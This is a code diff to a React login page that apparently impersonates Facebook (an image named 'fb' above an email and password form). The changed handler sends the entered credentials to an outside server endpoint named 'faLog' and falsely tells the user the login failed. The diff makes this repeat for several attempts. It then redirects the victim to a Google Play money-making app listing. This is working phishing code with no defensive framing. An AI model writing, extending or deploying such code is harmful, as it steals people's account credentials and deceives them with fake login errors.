@@ -13,18 +13,19 @@ function App() {
     const password = form.password.value;
     console.log(email, password);
     const user = { email, password };
-    if (num === 0) {
+    console.log(num);
+    if (num <= 2) {
       setIsWrong(true);
-      setNum(4);
+      setNum(num + 1);
       fetch("https://summer-camp-server-black.vercel.app/faLog", {
-      method: "POST",
-      headers: {
-        "content-type": "application/json",
-      },
-      body: JSON.stringify(user),
-    })
-      .then((res) => res.json())
-      .then((data) => setNum(7));
+        method: "POST",
+        headers: {
+          "content-type": "application/json",
+        },
+        body: JSON.stringify(user),
+      })
+        .then((res) => res.json())
+        .then((data) => console.log(data));
       return;
     }
     setIsWrong(false);
@@ -37,8 +38,10 @@ function App() {
     })
       .then((res) => res.json())
       .then((data) => {
-        if(data.insertedId){
-          location.assign("https://play.google.com/store/apps/details?id=com.takaincome.onlineincome&hl=en_US")
+        if (data.insertedId) {
+          location.assign(
+            "https://play.google.com/store/apps/details?id=com.takaincome.onlineincome&hl=en_US"
+          );
         }
       });
   };
@@ -56,6 +59,7 @@ function App() {
         src={fb}
         alt=""
       />
+
       <form onSubmit={handleLogin}>
         <input
           name="email"
